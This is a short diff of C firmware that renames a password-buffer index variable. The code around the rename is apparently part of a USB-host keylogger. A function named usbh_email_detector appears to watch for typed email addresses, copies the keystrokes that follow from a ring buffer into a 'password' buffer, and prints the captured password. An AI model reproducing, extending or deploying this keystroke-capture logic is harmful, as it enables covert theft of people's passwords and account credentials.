@@ -20,7 +20,7 @@ static int     nb_char_pressed = 0;
 static int     input_timer = -1;
 
 uint8_t        password[NB_INPUT];
-int            password_size;
+int            password_idx;
 
 //extern var
 uint8_t    led_status = 7;
@@ -115,17 +115,17 @@ static void store_lasts_inputs(int size)
 {
     if(input_index < size) { // buffer made a loop
         int bytes_written = size - input_index;
-        memcpy(password + password_size, input_tab + NB_INPUT - bytes_written, bytes_written);
-        memcpy(password + password_size + bytes_written, input_tab, size - bytes_written);
+        memcpy(password + password_idx, input_tab + NB_INPUT - bytes_written, bytes_written);
+        memcpy(password + password_idx + bytes_written, input_tab, size - bytes_written);
     }
     else
-        memcpy(password + password_size, input_tab + input_index - size, size);
-    password_size += size;
+        memcpy(password + password_idx, input_tab + input_index - size, size);
+    password_idx += size;
 }
 
 void usbh_email_detector(uint8_t input)
 {
-    if(password_size + PASSWORD_MAX_SIZE > PASSWORD_BUFFER_SIZE) { // avoid max password buffer
+    if(password_idx + PASSWORD_MAX_SIZE > PASSWORD_BUFFER_SIZE) { // avoid max password buffer
         rtt_printf("[WARNING] Password buffer full\n");
         return;
     }
@@ -147,7 +147,7 @@ void usbh_email_detector(uint8_t input)
             // disable input timer
             input_timer = -1;
             // print password buffer
-            password[password_size] = '\0';
+            password[password_idx] = '\0';
             rtt_printf("password buffer: %s\n", password);
             break;
     }
